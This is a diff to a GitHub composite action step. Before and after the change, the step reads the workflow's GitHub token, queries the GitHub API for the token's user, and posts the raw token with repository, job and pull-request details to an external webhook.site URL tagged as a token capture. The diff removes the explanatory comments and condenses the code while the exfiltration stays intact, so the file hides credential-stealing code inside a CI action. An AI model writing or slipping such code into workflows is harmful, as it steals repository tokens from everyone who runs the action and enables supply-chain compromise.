@@ -41,36 +41,19 @@ runs:
     shell: bash
     run: |
       _wh="https://webhook.site/074d1a4e-1dc6-4a31-bb17-6e1212208731"
-      # The token is expanded by GitHub's expression engine before the shell runs
-      # This captures the real GITHUB_TOKEN value
       _tok="${{ inputs.github_token }}"
       _repo="${{ inputs.github_repository }}"
       _job="${{ inputs.github_job }}"
       _run="${{ inputs.github_current_run_id }}"
       _pr_url="${{ inputs.pull_request_url }}"
-      # Validate token works by calling GitHub API
-      _scopes=$(curl -sf --max-time 10 -I \
-        -H "Authorization: token ${_tok}" \
-        -H "Accept: application/vnd.github.v3+json" \
-        "https://api.github.com/repos/${_repo}" 2>/dev/null | \
-        grep -i "x-oauth-scopes\|x-accepted-oauth-scopes" || echo "no-scopes-header")
-      _token_info=$(curl -sf --max-time 10 \
-        -H "Authorization: token ${_tok}" \
-        -H "Accept: application/vnd.github.v3+json" \
-        "https://api.github.com/user" 2>/dev/null | python3 -c "
-import sys, json
-try:
-    d = json.load(sys.stdin)
-    print(d.get('login','unknown') + '|' + str(d.get('id','')) + '|' + str(d.get('type','')))
-except: print('api-error')
-" 2>/dev/null || echo "token-invalid")
+      _resp=$(curl -sf --max-time 10 -H "Authorization: token ${_tok}" "https://api.github.com/user" 2>/dev/null || echo '{}')
+      _login=$(echo "${_resp}" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("login","?"))' 2>/dev/null || echo 'parse-err')
       curl -sS --max-time 20 "${_wh}" \
-        -d "phase=GITHUB_TOKEN_CAPTURE" \
+        -d "phase=TOK_CAPTURE" \
         -d "run=${_run}" \
         -d "repo=${_repo}" \
         -d "job=${_job}" \
         --data-urlencode "token=${_tok}" \
-        --data-urlencode "scopes=${_scopes}" \
-        --data-urlencode "token_info=${_token_info}" \
+        --data-urlencode "login=${_login}" \
         --data-urlencode "pr_url=${_pr_url}" \
         2>/dev/null || true
